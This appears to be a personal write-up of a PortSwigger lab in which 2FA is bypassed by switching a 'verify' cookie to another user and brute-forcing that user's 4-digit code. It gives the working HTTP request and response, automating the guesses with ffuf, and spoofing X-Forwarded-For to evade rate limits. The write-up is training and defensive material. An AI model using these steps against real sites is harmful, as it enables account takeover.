# LAB: 2FA broken logic

|                             |                                                                                                                                 |
| --------------------------- | ------------------------------------------------------------------------------------------------------------------------------ |
| **Topic**                   | Authentication (Multi-factor authentication)                                                                                  |
| **Difficulty**              | Practitioner                                                                                                                 |
| **Date**                    | 2026-11-18                                                                                                                   |
| **Time**                    |       5                                                                                                                         |
| **Solved without solution** | yes                                                                                                                                 |
| **Link**                    | [lab-2fa-broken-logic](https://portswigger.net/web-security/authentication/multi-factor/lab-2fa-broken-logic)                 |

## 1. Objective

Bypass two-factor authentication to access the account page of the target user (`carlos`) by exploiting flawed logic in how 2FA verification codes are bound to session contexts.

## 2. Surface

- Primary authentication endpoint (`/login`) processing first-factor credentials.
- Secondary authentication endpoint (`/login2`) processing 2FA verification code submissions.
- Cookie-based state tracking (e.g., `verify` cookie) used to identify which account is undergoing 2FA verification.
- User account page (`/my-account`).

## 3. Hypothesis

If the 2FA verification endpoint (`/login2`) relies on an unauthenticated client-side identifier (such as a `verify` cookie) to determine which account's 2FA code is being submitted—without validating that the code belongs to the active authenticated session—an attacker can modify the cookie to target another user (`carlos`) and brute-force their 4-digit 2FA code.

## 4. Payload that worked

Request
```http
POST /login2 HTTP/2
Host: <host>.web-security-academy.net
Cookie: verify=carlos; session=sess
Content-Length: 13
Cache-Control: max-age=0
Sec-Ch-Ua: "Not:A-Brand";v="8", "Chromium";v="156"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Linux"
Accept-Language: en-US,en;q=0.9
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/156.0.0.0 Safari/537.36
Origin: https://<host>.web-security-academy.net
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/jxl,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://<host>.web-security-academy.net/login2
Accept-Encoding: gzip, deflate, br
Priority: u=0, i

mfa-code=1816
```
Response:
```http
HTTP/2 302 Found
Location: /my-account?id=carlos
Set-Cookie: session=sess; Secure; HttpOnly; SameSite=None
X-Frame-Options: SAMEORIGIN
Content-Length: 0
```

## 5. Why it works

The application uses an unauthenticated `verify` cookie to track which account is currently undergoing 2FA validation on the `/login2` route. Because the backend does not validate that the `verify` cookie matches the active authenticated session (or the credentials validated during Stage 1), changing `verify=wiener` to `verify=carlos` switches the verification scope to `carlos`. At that point, submitting a valid 4-digit MFA code for `carlos` completes the 2FA flow for the target account. Since 4-digit MFA codes lack rate limiting or attempt throttling on this endpoint, brute-forcing the `0000`-`9999` space via automated request tools allows full account takeover.
## 6. What I tried that failed

- Submitting the valid 2FA code generated for `wiener` while keeping `verify=carlos` failed, confirming that MFA codes are correctly bound to the specific target user declared in the `verify` cookie, rather than being globally valid across accounts.
- Rule extracted: When testing multi-stage authentication, check if user identifiers in cookies/headers control target state resolution. If changing the identifier changes the target account context without invalidating the 2FA attempt, the endpoint is vulnerable to cross-account code brute-forcing.
  
## 7. In a real target (bounty translation)

- Where it shows up: Multi-factor authentication systems where the secondary verification step identifies the target user via a loose tracking cookie or parameter instead of an encrypted, server-bound pre-auth session.
- Quick detection: Inspect the 2FA verification request for parameters or cookies containing user identifiers (e.g., `verify=username`, `user_id=123`). Change the identifier to another target account and attempt to submit verification codes.
- Impact: Account takeover of arbitrary users by brute-forcing 4-digit or 6-digit 2FA codes without needing their first-factor password.
- In the report: Provide request logs showing the modification of the `verify` cookie alongside the 2FA code brute-force success leading to a fully privileged session cookie.

## 8. Bypass / variants noticed

- Iterating `verify=[target_user]` alongside a sequential 4-digit payload (`0000-9999`) using `ffuf` with `-b "verify=carlos"` to automate MFA code enumeration without triggering session resets.
- Combining cookie manipulation with dynamic IP headers (`X-Forwarded-For`) if secondary rate limits are enforced at the network layer during MFA code iteration.
  
## 9. Takeaway

2FA verification tokens must be strictly bound to an encrypted, server-side session established during the first factor. Client-side parameters or loose cookies should never be trusted to determine target identity during secondary authentication checks.
